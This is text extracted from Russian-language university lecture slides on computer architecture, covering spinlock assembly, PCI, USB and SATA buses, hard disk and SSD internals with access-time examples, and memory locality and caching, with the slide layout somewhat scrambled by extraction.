acquireLock:                                  Ядро1            Ядро2
 .retry:                               ЦПУ ← память
                                                      B
   bts byte [L], 0                     CF ← ЦПУ:L|0       ЦПУ ← память
                                                      T
   jc .retry                                                                 B
                                       память:L ← 1   S   CF ← ЦПУ:L|0
   ret        Может возникнуть                                               T
                Состояние Гонки                           память:L ← 1       S
releaseLock:
   btr byte [L], 0                    Время
   ret
                                                                           22
                                                                 © 2024 МГУ/ВМК/СП




        Синхронизация обращений к памяти
• Захват блокировки
• Работа с общими
  (разделяемыми)
  переменными                                      #LOCK
• Освобождение
  блокировки                           Захватываем шину данных

acquireLock:                          Ядро1                Ядро2
 .retry:                  l   ЦПУ ← память
                                               B      Ждем, пока
   lock bts byte [L], 0   o   CF ← ЦПУ:L       T      освободится
   jc .retry              c
                                                      шина памяти
                              память:L ← 1     S
   ret                    k
                          l                         ЦПУ ← память
                                                                          B
releaseLock:              o                         CF ← ЦПУ:L            T
   lock btr byte [L], 0   c
                                                    память:L ← 1          S
                          k
   ret
                                                                        23
                              Время
                                                                              © 2024 МГУ/ВМК/СП




            Синхронизация обращений к памяти

   • Явно указываемый префикс                   acquireLock:
      lock                                         lock bts byte [L], 0
        – Применим только к                        jc .retry
          некоторым командам                       ret
          ADD, AND, BTC, BTR, BTS,
          CMPXCHG, …                             .retry:
             • Первый операнд команды –            pause
               память                              lock bts byte [L], 0
   • Все время выполнения                          jc .retry
     команды процессор                             ret
     удерживает шину памяти,
     посылая на нее сигнал #LOCK                В современных процессорах команда
   • Постоянный захват шины                     pause используется как подсказка, что
     негативно сказывается на                   выполнение находится в цикле
     производительности                         активного ожидания (busy wait)

ОС Linux использует для реализации активного ожидания не bts/btr, а гораздо
более быструю команду cmpxchg
                                                                                     24
http://heather.cs.ucdavis.edu/~matloff/50/PLN/lock.pdf (на английском)
                                                                                        © 2024 МГУ/ВМК/СП




                        Примеры шин (2/3)

• Общая шина ввода/вывода для подключения
  периферийных устройств Peripheral component
  interconnect (PCI), 1992, Intel, открытый стандарт.
   – PCI 1.0 / 2.0
       • Топология - общая шина, децентрализованный арбитраж
       • 32 линии, общие для адресов и данных
            – Передача данных транзакциями, возможна приостановка
       • Частота 33 MHz
   – Расширения
       • PCI 64, PCI 66, PCI 64/66, PCI-X (266 и 533 МГц)
   – PCI Express (PCI-E), июль 2002, Intel
       • Топология – звезда, подключение устройств через двунаправленные
         соединения различной ширины. x1 – 4 проводника (дифф. пара)
            – x1, x2, x4, x8, x12, x16, x32
       • Скорость работы соединения варьируется
            – 2.5, 5.0, 8.0 и 16GT/s (32GT/s в PCI 5.0) , T/s - передач по шине в секунду
       • Избыточное кодирование данных, 128b/130b в PCI 3.0 и более новых,
         8b/10b – в старых версиях шины
• Идентификация (адресация) PCI-устройств
   – 256 шин  32 устройства  8 функций = 65536 PCI-устройств                                 25
                                                                                 © 2024 МГУ/ВМК/СП




                                               Примеры шин (2/3)

      • Конфигурационное пространство регистров PCI-устройства
        составляет суммарно 256 байт
      • Регистры первых 64 байт стандартизированы
      • Чтение и запись в регистры
              – Через порты ввода/вывода 0xCF8 (адрес) и 0xCFC (данные)
                командами IN и OUT
              – Через отображение регистров PCI-устройства в 4КБ адресного
                пространства памяти (зависит от реализации…)
                В адресном пространстве «теряется» 256 МБ памяти
           Порт адреса
           +---+---------+-------+----------+--------+---------------+-+-+
           |31 |30     24|23   16|15      11|10     8|7             2|1|0|
           +---+---------+-------+----------+--------+---------------+-+-+
           | с | резерв |шина    |устройство| функция|Индекс регистра|0|0|
           +---+---------+-------+----------+--------+---------------+-+-+

  mov eax, 1_0000000_00000000_00000_000_000000_00
  mov dx, 0xcf8
  out dx, eax ; обращение в порт адреса
  mov dx, 0xcfc
  in eax, dx ; чтение из порта данных

Дополнительный технический материал (на английском)                                     26
https://pcisig.com/sites/default/files/files/PCI_Express_Basics_Background.pdf
                                                                                                                © 2024 МГУ/ВМК/СП




                                  Примеры шин (3/3)

•   USB, 1996
     –   Замена «зоопарка» интерфейсов одним унифицированным
           •   PS/2, последовательный порт, параллельный порт, порт для подключения джойстика, SCSI, … → USB
           •   … заодно решили вопрос электропитания некоторых внешних устройств
     –   Последовательная передача данных вместо параллельной
           •   В первых версиях всего 4 линии: земля, питание, дифференциальная пара D+ и D-
           •   Начиная с версии 3.0 линий стало больше
           •   «Горячее» подключение
     –   Топология – звезда, до 127 устройств, разветвители,
         каждое устройство содержит оконечные точки (15/15 + 1/1 управляющие)
         данные передаются через однонаправленный логический канал
     –   4 типа передач: управляющие, поточные, прерывания, изохронные
     –   Контроллер шины USB – eXtensible Host Controller Interface (xHCI),
         более ранние версии – OHCI и UHCI
           • Сам контроллер является PCI-устройством                                        Способы связи
•   Serial ATA, 2000                                                                        • Симплекс – связь в одну сторону
                                                                                            • Полудуплекс – прием и
     –   Как и USB, заменил параллельный интерфейс – ATA (IDE)
                                                                                              передача идут поочередно, с
     –   7 линий: 3 линии – земля, 2 дифференциальные пары                                    разделением во времени
         (прием и передача) в режиме полудуплекса                                           • Дуплекс – одновременная
     –   Скорости интерфейса версий 1-3: 1.5, 3, 6 GBit/s                                     двусторонняя передача
     –   SATA vs SAS (Serial Attached SCSI)                                                   информации
           •   SAS обратно совместим с интерфейсом SATA
           •   Используется в серверах, тогда как SATA – в настольных компьютерах
           •   SCSI – Small Computer System Interface, ранее применялся в рабочих станциях и серверах
                                                                                                                        27
                                                      © 2024 МГУ/ВМК/СП




                 Далее: Аппаратура ЭВМ

• Организация аппаратного обеспечения компьютера
   – Физические основы
   – Технологии производства интегральных схем (IC)
   – Эмпирические законы развития IC
   – Шины и периферийные устройства
• Организация памяти
   – НЖМД и твердотельные накопители
   – Локальность, кэш, производительность памяти
• Микроархитектура ЦПУ
   – Конвейер, микрокод, …
   – CISC vs. RISC, архитектура RISC-V
• Многозадачная работа компьютера
   – Загрузка
   – Изоляция пользовательских программ

                                                             28
              © 2024 МГУ/ВМК/СП




Лекция 0x15


 29 апреля
                                                                         © 2024 МГУ/ВМК/СП




                   Внутреннее устройство HDD
            Коромысло со
                           Шпиндель
            считывающей
            головкой                                               Пластины


       Привод
       коромысла




                                                        + различная
                                                        электроника, включая
                                                        процессор и память
       Разъем
Serial Attached SCSI                                                             2
                               Изображение является собственностью Seagate Technology
                                                                        © 2024 МГУ/ВМК/СП



                     Геометрия диска
• Диск состоит из пластин, каждая обладает двумя поверхностями.
• Каждая поверхность состоит из концентрических кругов – дорожек.
• Каждая дорожка состоит из секторов, разделенных промежутками.
                                           Магнитно-силовая микроскопия поверхности
                                           жесткого диска
                                           Белые и черные области показывают изменение
                                           намагничивания:
                                           белый цвет обозначает силы отталкивания, а
  Дорожки                                  черный — силы притяжения.
                 Поверхность
                                                  Дорожка        Промежутки




                 Шпиндель




                                                 Сектора                        3
                                                         © 2024 МГУ/ВМК/СП




  Геометрия диска (несколько пластин)

• Равноудаленные от шпинделя дорожки образуют цилиндр.
                               Цилиндр


       Поверхность 0
                                         Пластина 0
       Поверхность 1
       Поверхность 2
                                         Пластина 1
       Поверхность 3
       Поверхность 4
                                         Пластина 2
       Поверхность 5


                           Шпиндель




                                                                 4
                                                                    © 2024 МГУ/ВМК/СП



                    Емкость диска
• Емкость: максимальное количество сохраняемых бит.
   – Производители выражают емкость в «необычных» гигабайтах,
     1 ГБ = 109 байтам.
   – Различают десятичные (СИ) и двоичные приставки (МЭК)
   – Разница: КБ и КиБ =2.4%, МБ и МиБ 4.9%, ТБ и ТиБ 9.95%
• Емкость определяется следующими технологическими
  факторами:
   – Плотность записи / линейная плотность (биты/дюймы – BPI): сколько
     битов может быть размещено на одном дюйме дорожки.
   – Трековая плотность (треки/дюйм – TPI): сколько треков может быть
     размещено на одном дюйме радиуса.
   – Поверхностная плотность (биты/дюймы2): произведение линейной
     плотности на трековую плотность.
• Современные диски группируют дорожки в несколько зон
  записи
   – Каждая дорожка в зоне состоит из одного и того же количества
     секторов, определяемого длиной самой короткой дорожки.
   – У каждой зоны различное количество дорожек/секторов

                                                                            5
                                                         © 2024 МГУ/ВМК/СП




          Вычисление емкости диска

Емкость = (#байт/сектор) x (среднее # сектор/дорожка) x
      (# дорожка/поверхность) x (# поверхность/пластина) x
      (# пластина/диск)

Пример:
   – 512 байт/сектор
   – 300 сектор/дорожка (в среднем)
   – 20,000 дорожка/поверхность
   – 2 поверхность/пластина
   – 5 пластина/диск


Емкость = 512 x 300 x 20000 x 2 x 5 = 30,720,000,000 = 30.72ГБ6
                                                      © 2024 МГУ/ВМК/СП




       Работа с диском (одна пластина)

Поверхность
                                 Считывающая головка закреплена
диска вращается
                                 на конце коромысла и парит над
с фиксированной
                                 поверхностью на тонкой воздушной
скоростью.
                                 подушке.




                    шпиндель
                     шпиндель
                  шпиндель
                  шпиндель




                                Радиально перемещаясь,
                                коромысло может выставить
                                считывающую головку над
                                любой дорожкой.



                                                              7
                                              © 2024 МГУ/ВМК/СП




Структура диска – вид сверху на одну пластину


             Поверхность разбита на дорожки

             Дорожки разделены на сектора




                                                      8
                                  © 2024 МГУ/ВМК/СП




     Доступ к диску




Считывающая головка в указанной
позиции над диском



                                          9
                                © 2024 МГУ/ВМК/СП




     Доступ к диску




Направление вращения – против
часовой стрелки



                                       10
                               © 2024 МГУ/ВМК/СП




Доступ к диску – Чтение




Перед чтением синего сектора



                                      11
                                        © 2024 МГУ/ВМК/СП




          Доступ к диску – Чтение




Синий сектор
   считан


          После чтения синего сектора



                                               12
                                               © 2024 МГУ/ВМК/СП




          Доступ к диску – Чтение




Синий сектор
   считан
          Поступил запрос на чтение красного
          сектора



                                                      13
                                               © 2024 МГУ/ВМК/СП




          Доступ к диску – Поиск




Синий сектор   Поиск Красного
   считан         сектора


          Ищем дорожку на которой расположен
          красный сектор

                                                      14
                                                 © 2024 МГУ/ВМК/СП



Доступ к диску – временная задержка из-за
                 вращения




Синий сектор   Поиск Красного   Латентность
   считан         сектора        вращения

          Вынужденное ожидание того момента, когда
          красный сектор достигнет считывающей
          головки

                                                        15
                                                      © 2024 МГУ/ВМК/СП




          Доступ к диску – Чтение




Синий сектор   Поиск Красного   Латентность   Красный сектор
   считан         сектора        вращения         считан


          Чтение красного сектора завершено



                                                             16
                                                           © 2024 МГУ/ВМК/СП




Доступ к диску – распределение времени




 Синий сектор     Поиск Красного   Латентность     Красный сектор
    считан           сектора        вращения           считан



Передача данных      Поиск         Латентность   Передача данных
                                    вращения

                                                                  17
                                                                      © 2024 МГУ/ВМК/СП




                Время доступа к диску
• Tдоступа = Tср. поиск + Tср. вращения + Tср. передача
• Время поиска (Tср. поиск)
    – Время, требуемое для перемещения считывающей головки в
      цилиндр, содержащий требуемый сектор.
    – Как правило Tср. поиск занимает 3—9 мс.
• Латентность вращения (Tср. вращения)
    – Время ожидания момента, когда первый бит запрашиваемого
      сектора достигнет считывающей головки.
    – Tср. вращения = ½ × (60 с. / RPM)
    – Типичная скорость вращения – 7200 RPM. Tср. вращения ≈ 4 мс.
• Время передачи (Tср. передача)
    – Время чтения содержимого сектора.
    – Tср. передача = (1/ср. # секторов на дорожке) × (60 с. / RPM)
                                                                             18
                                                                         © 2024 МГУ/ВМК/СП




      Пример оценки времени доступа
• Исходные характеристики:
   – Скорость вращения = 7200 RPM
   – Среднее время поиска = 9 мс
   – Среднее # секторов на дорожке = 400
• Оцениваем слагаемые и общую сумму:
   – Tср. вращения = 1/2 x (60 с/7200 RPM) x 1000 мс ≈ 4.17 мс
   – Tср. передачи = 60/7200 RPM x 1/400 с/дорожка x 1000 мс ≈ 0.02 мс
   – Tдоступа = 9 мс + 4.17 мс + 0.02 мс
• Выводы:
   – Время передачи существенно меньше остальных слагаемых.
   – Считать первый бит из сектора – «дорогая» операция, считывание
     остальных битов – «дешево».
   – Время доступа SRAM ≈ 4 нс для двойного слова, DRAM ≈ 60 нс
       • Диск медленнее SRAM в 40,000 раз, и …
       • … в 2,500 раз, чем DRAM
                                                                                19
                                                                                                      © 2024 МГУ/ВМК/СП




            Жесткий диск и «бутылочное горлышко»




                                                              Контроллер
                                                                   +
               Интерфейс SATA                              Память 256 МБ для                   Магнитные
                                                        хранения запрашиваемых                   диски
                     6 Гбит/с                                  секторов
                                                                                               249 МиБ/с



                                                 Макс. постоянная скорость передачи данных по
                                                              внешнему диаметру
                                                        (Max. Sustained Transfer Rate OD)

Рассматриваемый пример                                                                                       20
https://www.seagate.com/files/www-content/datasheets/pdfs/exos-x16-DS2011-1-1904US-en_US.pdf
                                                                 © 2024 МГУ/ВМК/СП




                 Логические блоки

• Первоначальный способ задания сектора: <C, H, S>
   – В разных зонах – разное число секторов на дорожке
   – Для обращения к диску необходимо знать его геометрию
• Более простой метод обращения к данным:
   – Сектора рассматриваются как последовательность логических блоков
     (0, 1, 2, ...)
• Соответствие между логическими блоками и (физическими)
  секторами
   – Отображение поддерживается аппаратурой =
     контроллер диска + «прошивка»
   – Номер логического блока → (поверхность, дорожка, сектор).
• Защита от выхода из строя отдельных цилиндров. Каждая зона
  записи содержит запасные цилиндры.
   – Размер диска после форматирования становится ощутимо меньше. 21
                                           © 2024 МГУ/ВМК/СП



Как работает ввод/вывод SATA-устройств
                 (1/5)
                      • ЦПУ (некоторое
                        вычислительное ядро)
                        запускает чтение сектора
         !              диска, записав по
                        определенному адресу
                        оперативной памяти
                        (адрес связан с SATA-
                        контроллером) команду
                        «чтение», номер
                        логического блока, адрес
                        буфера памяти, в который
     !                  необходимо поместить
                        содержимое сектора.


                                                  22
                                          © 2024 МГУ/ВМК/СП



Как работает ввод/вывод SATA-устройств
                 (2/5)
                      • Контроллер через
                        интерфейс SATA
                        отправляет запрос
                        (команду) на чтение
                        сектора соответствующему
                        диску




     !


!                                                23
                                            © 2024 МГУ/ВМК/СП



Как работает ввод/вывод SATA-устройств
                 (3/5)
                      • Контроллер диска
                        пересчитывает LBA
                        (линейный адрес) в тройку
                        CHS (поверхность,
                        дорожка, сектор),
                        считывает содержимое
                        сектора с пластин и
                        отправляет его SATA-
                        контроллеру
                      • Если запрашиваемый
                        сектор уже считывался
                        некоторое время назад,
                        его содержимое может
                        храниться в микросхеме
     !                  DRAM-памяти диска.
                        В таком случае данные
                        можно считать из нее, а не
                        с пластины.
!                                                  24
                                               © 2024 МГУ/ВМК/СП



Как работает ввод/вывод SATA-устройств
                 (4/5)
                         • SATA-контроллер
                           инициирует передачу
                           содержимого сектора
                           напрямую в память через
                           шину PCI в виде серии PCI-
                           транзакций записи
                     



     !


                                                      25
                                            © 2024 МГУ/ВМК/СП



Как работает ввод/вывод SATA-устройств
                 (5/5)
                      • После завершения записи
                        данных в память SATA-
                        контроллер должен как-то
                        сообщить процессору, что
                        все данные уже помещены
                        в память.
                      • SATA-контроллер через
                      шину   PCI пишет по
                        некоторому адресу памяти
                        (адрес связан с локальным
                        контроллером прерываний
                        вычислительного ядра)
                        сообщение – команду
                        вызвать аппаратное
     !                  прерывание в ядре
                        (механизм Message
                        Signaled Interrupts)
                      • Прерывание в процессоре
                        передает управление     26
                        функции-обработчику
                                                                                           © 2024 МГУ/ВМК/СП




         Ввод/вывод – промежуточные выводы

•   Избежать простоя процессора можно только перекрывая во времени его
    работу с независимо выполняющимся вводом/выводом
•   Аппаратура должна предоставлять (помимо контроллеров шин и диска)
     –   Прямой доступ к памяти для устройств
     –   Прерывания
     –   А что насчет безопасности?
          • Например, сетевая карта время от времени считывает содержимое памяти и куда-то это
            содержимое отправляет …
          • MMU – memory management unit, устройство, отвечающее за управление доступом к памяти со
            стороны процессора, условно, MMU – часть контроллера памяти
          • IOMMU – input–output memory management unit, блок управления памятью для операций ввода-
            вывода
•   Драйвер устройства – программа, отвечающая за работу конкретного
    устройства (оборудования), она обеспечивает связь между устройством и
    другими программами
•   Драйвер жесткого диска поддерживает очереди операций ввода/вывода
     –   Каждая операция – чтение или запись блока
     –   Описание запрашиваемой операции хранится в памяти
     –   Аппаратура, контроллер шины, старается выполнить запросы максимально быстро


                                                                                                  27
                                                                               © 2024 МГУ/ВМК/СП




              Энергонезависимая память

• DRAM и SRAM – энергозависимы
   – Информация теряется при отключении электропитания.
• Энергонезависимая память сохраняет свое состояние даже при
  отключении питания
   – ROM: программируется на этапе производства
   – Программируемая ROM (PROM): может быть запрограммирована
     пользователем один раз
   – Стираемая PROM (EPROM): может быть стерта (УФ, рентген)
   – Электрически стираемая PROM (EEPROM): стирание происходит через подачу
     электрического сигнала
   – Флеш-память: EEPROM с частичной возможностью стирания (по секторам)
       • Выдерживает порядка 100,000 циклов перезаписи.
• Сфера применения энергонезависимой памяти
   – Встраиваемые программы размещаются в ROM
     (BIOS, контроллеры дисков, сетевых и графических         Чтение и           Энергонеза-
     адаптеров, аппаратно-криптографические средства,…)        запись             висимость

   – Твердотельные диски
   – Кеш в обычных дисковых накопителях.                                  Высокая
                                                                         плотность

                                                                                         28
                                                    © 2024 МГУ/ВМК/СП




Энергонезависимая память – флеш
                                                    Flash




Для записи и стирания используется                         29
квантовый эффект туннелирования Фаулера-Нордхейма
                                                                  © 2024 МГУ/ВМК/СП




           Ячейки энергонезависимой памяти

• Записанная в ячейке информация определяется
  пороговым напряжением Vth на управляющем затворе
   – Наличие или отсутствие электронов в плавающем затворе влияет
     на пороговое напряжение
• Заряд в плавающем затворе можно варьировать,
  пороговое напряжение будет распределено между
  несколькими уровнями
   – Четыре уровня позволяют хранить два бита информации
   – …

                                                      SLC, MLC, TLC, QLC, ..




                                                                          30
  Стерли       Запрограммировали
                                                                                                 © 2024 МГУ/ВМК/СП




                     Твердотельные диски (SSD)
                                        Шина ввода/вывода

                                                          Запросы на чтение/запись
    Твердотельный диск (SSD)                              логических блоков

                                              Контроллер

     Flash-память
         Блок 0                                            Блок B-1
          Стр. 0     Стр. 1      … Стр. P-1 …                Стр. 0   Стр. 1   … Стр. P-1

•   Размер                                                                     SLC, MLC, TLC, QLC, ..
     –   страницы: 512 – 4096 байт
     –   блоки: 32 – 128 страниц
•   Данные читаются/пишутся страницами
•   Запись возможна только в очищенную страницу
•   Стирание (очистка) ранее записанных данных –
    целый блок
•   Блок в некоторый момент вырабатывается
     –   SLC – 100000 перезаписей и более                                                               31
     –   Современные SSD – примерно от 1000 до 10000 перезаписей
                                                                         © 2024 МГУ/ВМК/СП




          (типовая) Производительность SSD
Последовательное чтение   250 МБ/с       Последовательная запись       170 MB/s
Произвольное чтение       140 МБ/с       Произвольная запись           14 MB/s
Время доступа             30 мкс         Время старта записи 300 мкс



  • Причины малой скорости произвольной записи
      – Относительно высокая длительность стирания блока
        ( ≈1 мс.)
      – Запись одной страницы вызывает копирование всех
        остальных страниц, расположенных в данном блоке
           • Выделить (найти) новый блок и стереть его содержимое
           • Записать страницу в новый блок
           • Скопировать остальные страницы из исходного блока


                                                                                32
                                                                                                     © 2024 МГУ/ВМК/СП




                                    SSD vs. обычные диски
     •    Преимущества
            –   Нет движущихся частей  более быстрые, меньшее энергопотребление, устойчивы к внешним
                воздействиям
     •    Недостатки
            –   Ограниченное количество перезаписей
                  • Контроллер стремится смягчить износ, распределяя перезаписи
                  • Пример: гарантируют возможность произвольной записи 1 петабайта (1015 байт) данных до
                    момента выработки
            –   Высокая стоимость относительно HDD
                  •   В 2010 году, на два порядка, в 2015 году, на один порядок, 2024 – аналогично
     •    Применение
            –   Изначально: MP3 плееры, смартфоны, лэптопы
            –   Закрепились в настольных компьютерах и серверах в качестве «быстрого» диска
     •    Шина SATA – «узкое» место для SSD дисков!
     •    Как можно ускорить работу за счет подключения к шине?
            –   AHCI – очередная, (относительно) более скоростная версия контроллера
                  •   NCQ (Native Command Queuing)
                      изменение порядка операций ввода/вывода
            –   NVMe, 2011 – непосредственное подключение
                SSD-диска к шине, как PCI-устройства



https://www.seagate.com/docs/pdf/whitepaper/D2c_tech_paper_intc-stx_sata_ncq.pdf                            33
                                © 2024 МГУ/ВМК/СП



   Шины ввода/вывода –
устраняем лишние элементы
               • Твердотельный
                 накопитель сам по
                 себе может быть PCI-
                 устройством
               • Промежуточные
                 пересылки по
                 медленной шине SATA
                 исчезают!
               • NVMe – Non-Volatile
                 Memory Host
                 Controller Interface
                 Specification,
                 стандартизированный
                 способ подключения
                 SSD-дисков
                                       34
                                                                                            © 2024 МГУ/ВМК/СП




                  Оценка производительности

•   Численная характеристика относительной производительности, что именно будем
    оценивать?
     –   Всего компьютера в целом
     –   Отдельных компонент
     –   Генерируемого компилятором кода
•   Бенчмарк — задача, служащая эталонным тестом производительности
    вычислительной системы.
•   Классификация
     –   Синтетические / основанные на реальных приложениях
     –   Микробенчмарк
•   Индустриальные бенчмарки
     –   SPEC: Standard Performance Evaluation Corporation
           • Некоммерческая организация, занимающаяся разработкой стандартизированных бенчмарков
             для оценки производительности и энергоэффективности вычислительных систем. Бенчмарк для
             ЦПУ - SPEC CPU 2017.
     –   ScaLAPACK (Scalable Linear Algebra PACKage) — библиотека с открытым исходным кодом, для
         оценки производительности компьютеров с массивно-параллельной архитектурой
           • Решение систем линейных уравнений, обращение матриц, ортогональные преобразования,
             поиск собственных значений и др.




                                                                                                   35
                                        © 2024 МГУ/ВМК/СП




         Микробенчмарк жесткого диска

• Порядок обращения и
  размер блока
   – SEQ – последовательное
   – RND – произвольное
• Q – число запросов в одном
  потоке
• T – число потоков




                                               36
                                                           © 2024 МГУ/ВМК/СП




  Память с изменением фазового состояния

• PCM – Phase-change memory
   – Используются физические свойства халькогенидов (соединений
     халькогенов с металлами)
   – Изобретение конца 1950 годов, Стенфорд Офшинский, Ovitron
   – При изменении температуры халькогениды могут
     «переключаться» между двумя состояниями: кристаллическим и
     аморфным, в которых они имеют разное сопротивление
   – Время перехода между состояниями порядка нескольких
     наносекунд
   – Удалось добиться частичной кристаллизации, что дает 4
     состояния, т.е. каждый элемент хранит 2 бита
• Intel Optane (3d XPoint)
   – Попытка вывести на рынок энергонезависимую оперативную
     память
   – Анонс в 2015 году, первые устройства в 2017 году

                                                                  37
                                                      © 2024 МГУ/ВМК/СП




                 Далее: Аппаратура ЭВМ

• Организация аппаратного обеспечения компьютера
   – Физические основы
   – Технологии производства интегральных схем (IC)
   – Эмпирические законы развития IC
   – Шины и периферийные устройства
• Организация памяти
   – НЖМД и твердотельные накопители
   – Локальность, кэш, производительность памяти
• Микроархитектура ЦПУ
   – Конвейер, микрокод, …
   – CISC vs. RISC, архитектура RISC-V
• Многозадачная работа компьютера
   – Загрузка
   – Изоляция пользовательских программ

                                                             38
                                                                            © 2024 МГУ/ВМК/СП




  Тенденции в развитии запоминающих устройств
SRAM
Метрика          1980     1985    1990   1995    2000     2005     2010     2010:1980

$/МБ             19,200   2,900   320    256     100      75       60       320
t доступа (нс)   300      150     35     15      3        2        1.5      200



DRAM
Метрика          1980     1985    1990   1995    2000     2005     2010     2010:1980

$/МБ             8,000    880     100    30      1        0.1      0.06     130,000
t доступа (нс)   375      200     100    70      60       50       40       9
Размер (МБ)      0.064    0.256   4      16      64       2,000    8,000    125,000


HDD
Метрика          1980     1985    1990   1995    2000     2005     2010     2010:1980

$/МБ             500      100     8      0.30    0.01     0.005   0.0003 1,600,000
t доступа (мс)   87       75      28     10      8        4       3         29
Размер (МБ)      1        10      160    1,000   20,000   160,000 1,500,000 1,500,000
                                                                                      © 2024 МГУ/ВМК/СП




                                   Частота ЦПУ
Разработчики аппаратуры столкнулись с “Power Wall”

                                                                                            2015
                 1980    1990     1995     2000      2003   2005      2010     2015          
                                                                                            1980

                                                                      Core i7 Core i7
 ЦПУ             8086    80386   Pentium   P-III     P-4    Core 2
                                                                     Nehalem Haswell


 Частота (МГц)    1       20      150      600       3300   2000      2500     3000         3000


 Длительность
                 1000     50       6       1.6       0.3     0.5       0.4     0.25         3000
 такта (нс.)

 Количество
                  1        1       1        1         1       2         4        8            8
 ядер

 Эффективная
 длительность    1000     50       6       1.6       0.3    0.25       0.1    0.04125 24250
 такта (нс)
                                      © 2024 МГУ/ВМК/СП




Разрыв между ЦПУ и памятью
                «Power Wall»




                           «Memory Wall»




                                             41
              © 2024 МГУ/ВМК/СП




Лекция 0x16


   4 мая
                                      © 2024 МГУ/ВМК/СП




Разрыв между ЦПУ и памятью
                «Power Wall»




                           «Memory Wall»




                                              2
                                                 © 2024 МГУ/ВМК/СП




                  Локальность

• Основной принцип локальности: программа
  стремится использовать данные и инструкции с
  адресами близкими (либо точно такими же) к
  тем, которые использовались ранее.

• Временная локальность:
  – Повторные обращения


• Пространственная локальность:
  – В некоторый малый промежуток времени
                                                         3
    используются ячейки памяти с близкими адресами
                                                                © 2024 МГУ/ВМК/СП




                      Пример
               sum = 0;
               for (i = 0; i < n; i++)
                  sum += a[i];
               return sum;


• Выборка данных
  – Последовательные обращения к        Пространственная локальность
    элементам массива.
  – Переменная sum используется на      Временная локальность
    каждой итерации.
• Выборка инструкций
  – Последовательная выборка            Пространственная локальность
    инструкции.
  – Повторное выполнение инструкций в   Временная локальность
    цикле.                                                              4
                                                    © 2024 МГУ/ВМК/СП




         Оценка качества локальности

• Утверждение: способность беглым взглядом определить
  характер локальности кода является одним из
  необходимых навыков профессионального программиста.

• Вопрос: Достигается ли в функции sum_array_rows
  локальность обращений к массиву a?

            int sum_array_rows(int a[M][N]) {
                int i, j, sum = 0;

                for (i = 0; i < M; i++)
                    for (j = 0; j < N; j++)
                        sum += a[i][j];
                return sum;                                 5
            }
                                                    © 2024 МГУ/ВМК/СП




              Еще один пример

• Вопрос: достигается ли в функции sum_array_cols
  локальность обращений к массиву a?


         int sum_array_cols(int a[M][N]) {
             int i, j, sum = 0;

             for (j = 0; j < N; j++)
                 for (i = 0; i < M; i++)
                     sum += a[i][j];
             return sum;
         }



                                                            6
                                                    © 2024 МГУ/ВМК/СП




                Третий пример

• Вопрос: Как преобразовать гнездо циклов, что бы проход
  по 3-мерному массиву выполнялся с шагом 1 (и т.о.
  достичь пространственной локальности)?

          int sum_array_3d(int a[M][N][N]) {
              int i, j, k, sum = 0;

              for (i = 0; i < M; i++)
                  for (j = 0; j < N; j++)
                      for (k = 0; k < N; k++)
                          sum += a[k][i][j];
              return sum;
          }

                                                            7
                                                           © 2024 МГУ/ВМК/СП




                Иерархия памяти

• Ряд фундаментальных свойств аппаратуры и ПО:
   – Более быстрые устройства хранения стоят дороже, имеют
     меньший объем и потребляют больше энергии.
   – Разрыв в скорости работы между ЦПУ и оперативной памятью
     увеличивается.
   – В хорошо написанных программах демонстрируется хорошая
     локальность.


• Данные свойства дополняют друг друга и …

• … выводят на идею иерархической организации памяти.

                                                                   8
                                                                                       © 2024 МГУ/ВМК/СП



                               Иерархия памяти
                                     L0:
                                           Регистры   Регистры ЦПУ содержат машинные
                                                      слова извлеченные из L1 кэша

                               L1:         L1 кэш
                                           (SRAM)         L1 кэш содержит строки кэша L2
Меньше,
быстрее,                 L2:
дороже                                     L2 кэш
                                                                L2 кэш содержит строки
                                           (SRAM)               извлеченные из оперативной
                                                                памяти
                   L3:
                                Оперативная память
Больше,                              (DRAM)                           Оперативная память содержит
медленнее,                                                            блоки извлеченные с дисков
дешевле
             L4:                                                            Локальные диски
                                 Локальные диски
                                                                            содержат данные
                                                                            извлеченные из сети


     L5:                       Удаленные хранилища

                                                                                               9
                                                              © 2024 МГУ/ВМК/СП




                           Кэш
• Кэш: меньшее объемом, но более быстрое устройство
  хранения, выступает в роли промежуточного хранилища
  для большего, но более медленного устройства.
• Основная идея иерархии памяти:
   – Для каждого k, более быстрое, меньшее устройство на уровне k
     выступает как кэш для большего, но более медленного устройства
     на уровне k+1.
• Почему это работает?
   – Из-за локальности программа обращается к данным на уровне k
     гораздо чаше чем к данным на уровне k+1.
   – Устройство уровня k+1 может быть более медленным → большего
     размера, более дешевым.
• Результат: Иерархическая память – большой объем
  данных, стоит сопоставимо с самой дешевой компонентой,
  работает с максимальной скоростью.

                                                                     10
                                                              © 2024 МГУ/ВМК/СП




         Основная идея кэша


                                       Небольшая, более быстрая,
  Кэш    8
         4         9    14
                        10      3      более дорогая память сохраняет
                                       подмножество блоков


              10
               4        Данные копируются блоками


                                        Большая, медленная, дешевая
                                        память рассматривается как
Память   0         1    2       3       набор блоков
         4         5    6       7
         8         9    10     11
         12        13   14     15

                                                                     11
                                                    © 2024 МГУ/ВМК/СП




              Попадание в кэш
                                     Запрашиваются
                     Запрашивается
                         блок 14     данные из блока b
                                     Блок b находится
  Кэш    8      9    14       3      в кэше:
                                     Попадание!




Память   0      1     2       3
         4      5     6       7
         8      9    10       11
         12     13   14       15

                                                           12
                                                            © 2024 МГУ/ВМК/СП




                       Промахи
                                         Запрашиваются
                         Запрашивается
                            блок 12      данные из блока b
                                         Блока b нет в кэше:
  Кэш     8
         12        9     14       3
                                         Промах!

                                         Блок b извлекается
              12         Запрашивается
                            блок 12      из памяти
                                         Блок b размещается
                                         в кэше
Память   0         1      2       3
                                         • Правила размещения
         4         5      6       7        определяют где будет
         8         9     10      11        находится блок b
                                         • Правила замещения
         12        13    14      15        определяют какой блок будет
                                           исключен из кэша
                                                                   13
                                                                        © 2024 МГУ/ВМК/СП




              Различные типы промахов

• Холодные (вынужденные) промахи
   – Причина – пустой кэш.
• Промахи из-за конфликтов
   – Количество мест размещения ограничено (может быть
     единственным)
      • Пример: блок i уровня k+1 размещается в блоке (i mod 4) на уровне k.
   – Промахи из-за конфликтов возникают когда несколько блоков
     размещаются на одном и том же месте.
      • Пример: запрос блоков 0, 8, 0, 8, 0, 8, ... Будет постоянно вызывать
        промахи.
• Промахи из-за нехватки емкости
   – Причина – используемых блоков (рабочее множество) больше,
     чем кэш может в себе вместить.
                                                                               14
                                                                                      © 2024 МГУ/ВМК/СП




                                     Примеры кэшей


Тип кэша             Что кэшируется?     Где кэшировано?        Задержка (такты) Управление

Регистры             Слова по 4-8 байт   Ядро ЦПУ                               0    Компилятор
